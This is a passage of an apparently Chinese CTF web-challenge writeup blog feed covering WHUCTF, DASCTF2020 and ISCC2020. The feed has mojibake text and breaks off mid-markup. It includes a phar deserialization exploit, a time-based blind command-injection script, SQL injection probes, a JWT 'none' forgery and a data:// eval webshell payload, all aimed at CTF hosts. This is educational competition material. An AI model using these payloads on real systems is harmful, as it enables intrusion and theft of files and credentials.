align=\&quot;center\&quot;&gt;&lt;a href=\&quot;view.php\&quot; &gt;ç‚¹æˆ‘å»çœ‹ä¸Šä¼ çš„æ–‡ä»¶&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">#header(&quot;refresh:3;url=index.php&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>view.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#include_once &quot;flag.php&quot;; </span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $dir;</span><br><span class="line">    <span class="keyword">private</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dir = <span class="string">&#x27;upload/&#x27;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="string">&#x27;echo &quot;&lt;div style=\&quot;text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;\&quot;&gt;Powered by: xxx&lt;/div&gt;&quot;;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;dir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;dir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_file_list</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $file = scandir(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_file_list</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $file = <span class="keyword">$this</span>-&gt;get_file_list();</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">2</span>; $i &lt; sizeof($file); $i++) &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;[&quot;</span>.strval($i - <span class="number">1</span>).<span class="string">&quot;]  <span class="subst">$file</span>[<span class="subst">$i</span>] &lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_img</span>(<span class="params">$file_name</span>) </span>&#123;</span><br><span class="line">        $name = $file_name;</span><br><span class="line">        $width = getimagesize($name)[<span class="number">0</span>];</span><br><span class="line">        $height = getimagesize($name)[<span class="number">1</span>];</span><br><span class="line">        $times = $width / <span class="number">200</span>;</span><br><span class="line">        $width /= $times;</span><br><span class="line">        $height /= $times;</span><br><span class="line">        $template = <span class="string">&quot;&lt;img style=\&quot;clear: both;display: block;margin: auto;\&quot; src=\&quot;<span class="subst">$this</span>-&gt;dir<span class="subst">$name</span>\&quot; alt=\&quot;<span class="subst">$file_name</span>\&quot; width = \&quot;<span class="subst">$width</span>\&quot; height = \&quot;<span class="subst">$height</span>\&quot;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $template;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">delete_img</span>(<span class="params">$file_name</span>) </span>&#123;</span><br><span class="line">        $name = $file_name;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($name)) &#123;</span><br><span class="line">            @unlink($name);</span><br><span class="line">            <span class="keyword">if</span>(!file_exists($name)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;æˆåŠŸåˆ é™¤! 3såè·³è½¬&lt;/p&gt;&quot;</span>;</span><br><span class="line">                header(<span class="string">&quot;refresh:3;url=view.php&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Can not delete!&quot;</span>;</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;æ‰¾ä¸åˆ°è¿™ä¸ªæ–‡ä»¶! &lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ins = <span class="keyword">new</span> View();</span><br><span class="line">chdir($ins-&gt;dir);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;å½“å‰ç›®å½•ä¸º &quot;</span> . $ins-&gt;dir . <span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line">$ins-&gt;show_file_list();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;show&#x27;</span>])) &#123;</span><br><span class="line">    $file_name = $_POST[<span class="string">&#x27;show&#x27;</span>];</span><br><span class="line">    $ins-&gt;show_img($file_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;delete&#x27;</span>])) &#123;</span><br><span class="line">    $file_name = $_POST[<span class="string">&#x27;delete&#x27;</span>];</span><br><span class="line">    $ins-&gt;delete_img($file_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($ins);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸ç”¨pharååºåˆ—åŒ–ä¹Ÿèƒ½getflagï¼Œæ²¡è¿‡æ»¤assertç›´æ¥ä¼ ä¸ªé©¬åŒ…å«</p><p>å†çœ‹çœ‹pharååºåˆ—åŒ–æ€æœ«æå¾—å§ï¼Œpharååºåˆ—åŒ–å½±å“çš„å‡½æ•°ï¼š</p><img src="/2020/05/23/WHUCTF-web-wp/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png" style="zoom:80%;"><p>åœ¨delete_imgå‡½æ•°é‡Œæˆ‘ä»¬çœ‹åˆ°äº†file_existså‡½æ•°ï¼Œç”±æ­¤ï¼Œæ€è·¯å¾ˆæ˜ç¡®ï¼Œä¸Šä¼ pharæ–‡ä»¶ï¼Œç„¶ååˆ é™¤æ–‡ä»¶å°±èƒ½è§¦å‘ååºåˆ—åŒ–äº†ï¼Œæ„é€ exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $dir;</span><br><span class="line">    <span class="keyword">private</span> $cmd=<span class="string">&quot;echo &#x27;ok&#x27;;readfile(&#x27;/var/www/html/flag.php&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> View;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;s.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸º phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">$phar-&gt;setMetadata($object); <span class="comment">//å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šä¼ pharæ–‡ä»¶ï¼Œæ”¹ä¸‹åç¼€ä¸ºgif,éœ€è¦ç”¨ç»å¯¹è·¯å¾„ï¼ŒæŸ¥çœ‹æºç å¾—åˆ°flag</p><img src="/2020/05/23/WHUCTF-web-wp/TIMæˆªå›¾20200525155136.png" style="zoom:80%;">]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2020 wp</title>
      <link href="2020/05/22/DASCTF2020-wp/"/>
      <url>2020/05/22/DASCTF2020-wp/</url>
      
        <content type="html"><![CDATA[<p>BJDCTFç¬¬ä¸‰å±Šå’ŒDASCTFè”åˆä¸¾åŠçš„æ¯”èµ›ï¼</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="å¸®å¸®å°çº¢èŠ±"><a href="#å¸®å¸®å°çº¢èŠ±" class="headerlink" title="å¸®å¸®å°çº¢èŠ±"></a>å¸®å¸®å°çº¢èŠ±</h3><p>è¿™é¢˜åˆšå¼€å§‹æœ‰éé¢„æœŸï¼Œç›´æ¥å†™æ–‡ä»¶å°±è¡Œ</p><p>æ”¹è¿‡ä¹‹åå¯ä»¥æ—¶é—´ç›²æ³¨çˆ†flagï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://183.129.189.60:10069/?imagin=&quot;</span></span><br><span class="line">payload1=<span class="string">&quot;sleep $(cat /flag|cut -c &#123;&#125;|tr &#123;&#125; 3)&quot;</span></span><br><span class="line">payload2=<span class="string">&quot;if test $(cat /flag|cut -c &#123;&#125;) = &#123;&#125;;then sleep 3;fi&quot;</span></span><br><span class="line">s=string.ascii_letters+string.digits+<span class="string">&#x27;&#123;@~^*_+&#125;&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f=flag</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            u=url+urllib.parse.quote(payload1.format(str(i),j))</span><br><span class="line">            r=requests.get(u,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag=flag+j</span><br><span class="line">            print(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f==flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h3><p>å…ˆæµ‹ä¸‹åŠŸèƒ½ï¼Œå‘ç°æœ‰ç™»é™†ï¼Œä½†æ˜¯ç”¨ä»€ä¹ˆè´¦å·å¯†ç éƒ½èƒ½ç™»é™†ï¼Œåº”è¯¥ä¸æ˜¯sqlæ³¨å…¥ï¼Œ</p><p>ç„¶åæœ‰ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹ï¼Œä¸Šä¼ ä»€ä¹ˆéƒ½ä¸ä¼šè§£æ</p><p>è¿˜æœ‰ä¸ªå±•ç¤ºå¤´åƒçš„åœ°æ–¹ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°</p><img src="/2020/05/22/DASCTF2020-wp/TIMæˆªå›¾20200523102902.png" style="zoom:50%;"><p>ä¸Šä¼ æ–‡ä»¶æ—¶æˆ‘ä»¬å¯ä»¥ç›®å½•ç©¿è¶Šï¼Œå¯ä»¥ä¸Šä¼ åˆ°ä¸Šçº§ç›®å½•ï¼Œä½†æ˜¯è¿˜ä¸ä¼šè§£æï¼Œæ—¢ç„¶ä¸Šä¼ çš„å†…å®¹å¯ä»¥æ˜¾ç¤ºå‡ºæ¥ï¼Œæˆ‘ä»¬ç›´æ¥æ„é€ åˆ°flagé‚£è®©å®ƒè¯»flagä¸å°±è¡Œäº†</p><img src="/2020/05/22/DASCTF2020-wp/TIMæˆªå›¾20200523102330.png" style="zoom:80%;"><p>è™½ç„¶ä¼šæç¤ºæ–‡ä»¶å­˜åœ¨ï¼Œä½†ä¸å½±å“æ–‡ä»¶è¯»å–ï¼Œç›´æ¥è§£ç base64åŠ å¯†çš„ç»“æœå¾—åˆ°flag</p><h3 id="è€å¼€å‘"><a href="#è€å¼€å‘" class="headerlink" title="è€å¼€å‘"></a>è€å¼€å‘</h3><p>fuzzä¸€ä¸‹ï¼Œå‘ç°ä¸‹é¢å¯ä»¥æ³¨å…¥</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27; and 2=&#x27;2&amp;password=admin</span><br></pre></td></tr></table></figure><p>çŒœæµ‹åå°sqlè¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æ³¨å…¥çš„å°±æ˜¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="number">2</span>=<span class="string">&#x27;2&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2020 writeup</title>
      <link href="2020/05/06/ISCC2020-writeup/"/>
      <url>2020/05/06/ISCC2020-writeup/</url>
      
        <content type="html"><![CDATA[<p>è®°ä¸€ä¸‹éƒ¨åˆ†é¢˜ç›®çš„writeupå§ï¼</p><a id="more"></a><h2 id="ç»ƒæ­¦é¢˜"><a href="#ç»ƒæ­¦é¢˜" class="headerlink" title="ç»ƒæ­¦é¢˜"></a>ç»ƒæ­¦é¢˜</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="é˜¿æ£®çš„çˆ±æƒ…-1"><a href="#é˜¿æ£®çš„çˆ±æƒ…-1" class="headerlink" title="é˜¿æ£®çš„çˆ±æƒ…-1"></a>é˜¿æ£®çš„çˆ±æƒ…-1</h4><p>æŠ“åŒ…å‘ç°Set-Cookieå­—æ®µï¼šæ·»åŠ å¹¶æ”¹æˆ<code>login=1</code></p><p>ç„¶åå‘ç°</p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200506215326.png" style="zoom:80%;"><p>è§£ä¸‹MD5å‘ç°æ˜¯<code>573495</code>ï¼Œåæ¥å¬è¯´flagåœ¨readme.txtï¼Œä¸è¿‡è¢«åˆ äº†</p><h4 id="Php-is-the-best-language"><a href="#Php-is-the-best-language" class="headerlink" title="Php is the best language"></a>Php is the best language</h4><p>ä¸‹è½½æ–‡ä»¶ç»™å‡ºæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;file&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (base64_encode(file_get_contents($filename)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> base64_encode(file_get_contents($filename));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $data = $_GET[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    $url=<span class="string">&#x27;./index.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$html=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    $s = $_POST[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">    $html.=<span class="string">&quot;&lt;p&gt;Ã¨Â°Â¢Ã¨Â°Â¢Ã¥Ââ€šÃ¤Â¸Å½!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰«ç›®å½•å‘ç°flag.php,å¾ˆç®€å•çš„ä¸€é“ååºåˆ—åŒ–ï¼Œexp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> baby;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//101.201.126.95:7003/?data=O:4:%22baby%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;</span></span><br></pre></td></tr></table></figure><p>base64è§£ç å³å¯</p><h4 id="What-can-images-do"><a href="#What-can-images-do" class="headerlink" title="What can images do"></a>What can images do</h4><p>æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œå‘ç°å›¾ç‰‡ç¤ºä¾‹é‚£é‡Œå¯ä»¥åŒ…å«ï¼Œç›´æ¥å›¾ç‰‡é©¬</p><p>ä¸Šä¼ å›¾ç‰‡é©¬</p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200506220940.png" style="zoom:80%;"><p>åŒ…å«å›¾ç‰‡é©¬</p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200506221214.png" style="zoom:80%;"><p>èšå‰‘è¿ï¼Œåœ¨flag.phpçœ‹åˆ°flag</p><h4 id="æœªçŸ¥çš„é£é™©-1"><a href="#æœªçŸ¥çš„é£é™©-1" class="headerlink" title="æœªçŸ¥çš„é£é™©-1"></a>æœªçŸ¥çš„é£é™©-1</h4><p>jwté¢˜ç›®ï¼Œæç¤ºå¯†ç æ˜¯flag{*}å½¢å¼ï¼Œä½†æ˜¯è¿™é¢˜ä¸ç”¨ç ´è§£ï¼Œç›´æ¥æŠŠåŠ å¯†ç®—æ³•ä¿®æ”¹æˆnoneå°±è¡Œï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt </span><br><span class="line">print(jwt.encode(&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;user&quot;</span>,<span class="string">&quot;iat&quot;</span>:<span class="number">1588775401</span>,<span class="string">&quot;jti&quot;</span>:<span class="string">&quot;b0b6f6e4fb94a81390aa7cca9ed7f773&quot;</span>&#125;,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200506224334.png" style="zoom:80%;"><p>æˆåŠŸæ›¿æ¢å‘ç°æ˜¯xxeï¼Œç›´æ¥è¯»flag.php</p><p><img src="/2020/05/06/ISCC2020-writeup/TIM%E6%88%AA%E5%9B%BE20200506225419.png"></p><h4 id="Where-is-file"><a href="#Where-is-file" class="headerlink" title="Where is file?"></a>Where is file?</h4><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($file, <span class="string">&quot;file://&quot;</span>)) &#123;</span><br><span class="line">    $file=str_replace(<span class="string">&quot;file://&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥åŒ…å«<code>data://</code>åè®®getshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> eval($_POST[1]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>flagåœ¨flag.phpé‡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;web_include_file&#125;</span><br></pre></td></tr></table></figure><h4 id="é˜¿æ£®çš„çˆ±æƒ…-2"><a href="#é˜¿æ£®çš„çˆ±æƒ…-2" class="headerlink" title="é˜¿æ£®çš„çˆ±æƒ…-2"></a>é˜¿æ£®çš„çˆ±æƒ…-2</h4><p>sqlæ³¨å…¥ï¼Œfuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤çš„å¹¶ä¸å¤šï¼Œä½†æŠŠç»å¸¸ç”¨çš„<code>()</code>è¿‡æ»¤äº†ï¼Œå¹¶ä¸”è¿‡æ»¤äº†<code>password</code>ï¼Œorder byåˆ¤æ–­æœ‰ä¸‰åˆ—ï¼Œä¸”ç¬¬äºŒä½ä¸ºå›æ˜¾ä½</p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200508154213.png" style="zoom: 80%;"><p>ä¹‹å‰æ²¡åšè¿‡è¿‡æ»¤æ‹¬å·çš„é¢˜ï¼Œæœäº†æœï¼Œå‘ç°å¯ä»¥ç”¨<code>order by</code>æ¯”è¾ƒæ³¨å…¥</p><p>å…ˆè¯´ä¸€ä¸‹<code>order by</code>ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“order by å¯ä»¥åˆ¤æ–­æŸ¥è¯¢çš„åˆ—æ•°ï¼Œä¸ºå•¥å‘¢ï¼Ÿ</p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200508154721.png" style="zoom:80%;"><p>æˆ‘ä»¬åœ¨æŸ¥è¯¢çš„æ—¶å€™ï¼Œorder by çš„ä½œç”¨æ˜¯å¯¹æŸåˆ—è¿›è¡Œæ’åºï¼Œå¹¶ä¸”æ˜¯ä»¥ASCIIç çš„é¡ºåºæ¥çš„</p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200508155539.png" style="zoom: 80%;"><p>å¦‚æœåˆ—æ•°è¶…è¿‡æŸ¥è¯¢çš„åˆ—æ•°è‡ªç„¶ä¼šæŠ¥é”™</p><p>é‚£ä¹ˆå¦‚ä½•è¿›è¡Œ<code>order by</code>æ¯”è¾ƒæ³¨å…¥å‘¢ï¼Ÿ</p><p>å°±è¿™é“é¢˜è€Œè¨€ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œpasswordåœ¨ç¬¬ä¸‰åˆ—ï¼Œå¹¶ä¸”åªæœ‰ä¸€æ¡æ•°æ®ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±å¯ä»¥æŒ‰ç…§</p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200508161743.png" style="zoom:80%;"><p>è¿›è¡Œæ¯”è¾ƒæ³¨å…¥ï¼Œexp:</p><figure class="highlight 